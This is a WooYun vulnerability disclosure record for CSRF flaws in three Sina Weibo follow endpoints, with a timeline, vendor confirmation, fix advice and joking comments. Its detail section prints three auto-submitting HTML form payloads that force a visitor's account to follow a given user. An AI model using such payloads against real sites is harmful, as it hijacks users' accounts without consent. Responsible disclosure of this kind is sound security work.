{"id": 73041, "wybug_id": "wooyun-2015-0160873", "wybug_title": "新浪微博CSRF之点我链接就会关注我", "wybug_corp": "新浪微博", "wybug_author": "zhchbin", "wybug_date": "2015-12-13 09:49", "wybug_open_date": "2016-01-25 18:01", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向公众公开  简要描述： 朋友问我为什么能找到微博的CSRF，答曰：没有女朋友打包几个接口一起发吧，不需要任何绕过。 详细说明：  存在问题的几个接口，都是跟关注用户相关的API\nhttp://game.weibo.com/site/user/ajaxFollowhttp://game.weibo.com/home/user/ajaxFollowhttp://book.weibo.com/newcms/i/weibo_relation.php\n测试用的HTML，没有校验referrer，无需绕过。test_01.html\n<form action=\"http://game.weibo.com/site/user/ajaxFollow\" method=\"post\"> <input type=\"text\" name=\"userId\" value=\"5209822066\" /> <script> document.forms[0].submit(); </script> </form>\ntest_02.html\n<form action=\"http://game.weibo.com/home/user/ajaxFollow\" method=\"post\"> <input type=\"text\" name=\"userId\" value=\"5209822066\" /> <script> document.forms[0].submit(); </script> </form>\ntest_03.html\n<form action=\"http://book.weibo.com/newcms/i/weibo_relation.php\" method=\"post\"> <input type=\"text\" name=\"userid\" value=\"5209822066\" /> <input type=\"text\" name=\"type\" value=\"follow\" /> <script> document.forms[0].submit(); </script> </form>\n   漏洞证明：  参考： WooYun: 新浪微博CSRF之点我链接就会关注   修复方案：  1. 验证referrer2. 找找还有没有存在类似问题的其他接口吧，这种类型的我不找了！3. 求Rank！   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-14 13:26 厂商回复： 感谢支持，已经联系相关业务修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-13 09:59 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:190 漏洞数:67        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  说的好像你提交了就有女朋友了一样。    \n     2015-12-13 10:13 |    \t\tzhchbin \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:21        | 要走得再远一些！)\t\t \n  @随风的风  人艰不拆 ==    \n     2015-12-13 10:19 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  不是发过了吗    \n     2015-12-13 10:36 |    \t\tzhchbin \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:21        | 要走得再远一些！)\t\t \n  @Mieless 这个是新的不同的接口，之前那个已经确认修复。本来标题有个第二波 又不见了。    \n     2015-12-13 11:51 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:190 漏洞数:67        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  @zhchbin   挖啥洞啊，还不去找女朋友啊    \n     2015-12-13 14:40 |    \t\t拖鞋快跑 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 实习小拖鞋)\t\t \n  说的好像你提交了就有女朋友了一样。    \n     2015-12-13 15:28 |    \t\tsocket \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:11        | )\t\t \n  @随风的风 不要瞎说大实话嘛。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}